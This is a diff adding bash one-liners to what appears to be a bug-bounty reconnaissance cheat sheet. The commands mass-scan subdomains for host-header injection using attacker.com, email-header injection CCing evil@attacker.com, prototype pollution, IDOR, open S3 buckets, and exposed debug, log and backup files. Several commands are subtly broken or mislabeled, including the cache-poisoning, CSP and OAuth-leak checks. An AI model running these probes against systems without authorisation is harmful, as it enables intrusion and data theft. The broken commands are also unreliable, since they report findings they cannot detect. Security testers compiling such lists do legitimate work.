@@ -1215,4 +1215,109 @@ cat upload_endpoints.txt | qsreplace 'file=shell.php' | httpx -silent -mc 200 -o
 cat subdomains.txt | httpx -silent -header 'X-Frame-Options' -o missing_xfo.txt
 ```
 
+### HTTP Parameter Pollution (Duplicate Params)
+```bash
+cat all_urls.txt | qsreplace 'param1=value1&param1=value2' | httpx -silent -mc 200 -o hpp_candidates.txt
+```
+
+### Server Info Disclosure (Version Leaks)
+```bash
+cat subdomains.txt | httpx -silent -sc -title -o server_versions.txt
+```
+
+### Password Reset Token Leak in URL
+```bash
+cat all_urls.txt | grep -i 'reset' | grep -E 'token=|key=' | httpx -silent -o reset_token_leak.txt
+```
+
+### Host Header Injection
+```bash
+cat subdomains.txt | httpx -silent -H "Host: attacker.com" -fr "attacker.com" -o host_header_injection.txt
+```
+
+### Web Cache Poisoning
+```bash
+cat all_urls.txt | qsreplace 'X-Original-URL: /evil' | httpx -silent -fr 'evil' -o cache_poisoning.txt
+```
+
+### AWS Bucket Takeover (S3)
+```bash
+cat subdomains.txt | awk -F. '{print $1"."$2}' | while read domain; do aws s3 ls s3://$domain --no-sign-request; done
+```
+
+### Exposed Secret Tokens in Robots.txt
+```bash
+cat subdomains.txt | httpx -silent -path /robots.txt -fr 'token|key|secret' -o secret_leak_robots.txt
+```
+
+### Email Injection in Contact Forms
+```bash
+cat contact_forms_urls.txt | qsreplace 'email=attacker%0A%0DCC%3Aevil@attacker.com' | httpx -silent -mc 200 -o email_injection.txt
+```
+
+### PHP Info Disclosure (info.php)
+```bash
+cat subdomains.txt | httpx -silent -path /info.php -mc 200 -o phpinfo_exposed.txt
+```
+
+### Debug Endpoints Exposure (Spring Boot Actuator)
+```bash
+cat subdomains.txt | httpx -silent -path-list <(echo -e '/actuator/health\n/actuator/env\n/actuator/mappings') -mc 200 -o exposed_actuator.txt
+```
+
+### Directory Listing Enabled
+```bash
+cat subdomains.txt | httpx -silent -path '/' -fr 'Index of' -o directory_listing.txt
+```
+
+### Kubernetes Dashboard Exposure
+```bash
+cat subdomains.txt | httpx -silent -path '/#/login' -mc 200 -o kube_dashboard_exposed.txt
+```
+
+### Log File Exposure (access.log, error.log)
+```bash
+cat subdomains.txt | httpx -silent -path-list <(echo -e '/access.log\n/error.log') -mc 200 -o exposed_logs.txt
+```
+
+### Backup Files in Root (zip, tar, sql)
+```bash
+cat subdomains.txt | httpx -silent -path-list <(echo -e '/backup.zip\n/db.sql\n/site.tar.gz') -mc 200 -o backup_files.txt
+```
+
+### Insecure Direct Object Reference (IDOR)
+```bash
+cat idor_urls.txt | qsreplace 'user_id=123' | httpx -silent -mc 200 -o idor_candidates.txt
+```
+
+### CSP Bypass (Missing or Weak CSP)
+```bash
+cat subdomains.txt | httpx -silent -H 'Content-Security-Policy' -o weak_csp.txt
+```
+
+### Open API Endpoints Discovery
+```bash
+cat subdomains.txt | httpx -silent -path /swagger.json -mc 200 -o swagger_exposed.txt
+```
+
+### OAuth Token Leak in URLs
+```bash
+cat all_urls.txt | grep -i 'access_token=' -o oauth_token_leaks.txt
+```
+
+### GraphQL Endpoint Discovery
+```bash
+cat subdomains.txt | httpx -silent -path /graphql -mc 200 -o graphql_found.txt
+```
+
+### Prototype Pollution via Params
+```bash
+cat all_urls.txt | qsreplace '__proto__[test]=polluted' | httpx -silent -fr 'polluted' -o prototype_pollution.txt
+```
+
+### WordPress XML-RPC Abuse
+```bash
+cat subdomains.txt | httpx -silent -path /xmlrpc.php -mc 200 -o xmlrpc_found.txt
+```
+
 
